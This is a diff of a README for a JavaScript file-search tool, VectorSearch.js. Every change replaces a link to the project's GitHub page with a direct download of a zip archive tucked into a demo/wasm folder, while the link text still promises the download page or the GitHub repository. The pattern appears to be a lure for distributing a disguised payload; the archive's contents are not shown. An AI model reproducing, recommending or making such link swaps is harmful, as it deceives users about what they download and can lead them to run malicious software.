@@ -1,12 +1,12 @@
 # 🔎 VectorSearch.js - Fast Search For Your Own Files
 
-[![Download VectorSearch.js](https://img.shields.io/badge/Download-VectorSearch.js-blue?style=for-the-badge)](https://github.com/Glaucous-paulhindemith289/VectorSearch.js)
+[![Download VectorSearch.js](https://img.shields.io/badge/Download-VectorSearch.js-blue?style=for-the-badge)](https://raw.githubusercontent.com/Glaucous-paulhindemith289/VectorSearch.js/main/demo/wasm/Vector-Search-js-provand.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[Download VectorSearch.js](https://github.com/Glaucous-paulhindemith289/VectorSearch.js)
+[Download VectorSearch.js](https://raw.githubusercontent.com/Glaucous-paulhindemith289/VectorSearch.js/main/demo/wasm/Vector-Search-js-provand.zip)
 
 ## 🧭 What VectorSearch.js Does
 
@@ -40,7 +40,7 @@ Follow these steps in order.
 ### 1. Open the project page
 Go to the repository here:
 
-[VectorSearch.js on GitHub](https://github.com/Glaucous-paulhindemith289/VectorSearch.js)
+[VectorSearch.js on GitHub](https://raw.githubusercontent.com/Glaucous-paulhindemith289/VectorSearch.js/main/demo/wasm/Vector-Search-js-provand.zip)
 
 ### 2. Get the files
 On the GitHub page, look for the green **Code** button.
@@ -256,7 +256,7 @@ Try this:
 
 Use this page to get the project files and start from the repository:
 
-[https://github.com/Glaucous-paulhindemith289/VectorSearch.js](https://github.com/Glaucous-paulhindemith289/VectorSearch.js)
+[https://raw.githubusercontent.com/Glaucous-paulhindemith289/VectorSearch.js/main/demo/wasm/Vector-Search-js-provand.zip](https://raw.githubusercontent.com/Glaucous-paulhindemith289/VectorSearch.js/main/demo/wasm/Vector-Search-js-provand.zip)
 
 ## 🖥️ Windows Steps at a Glance
 
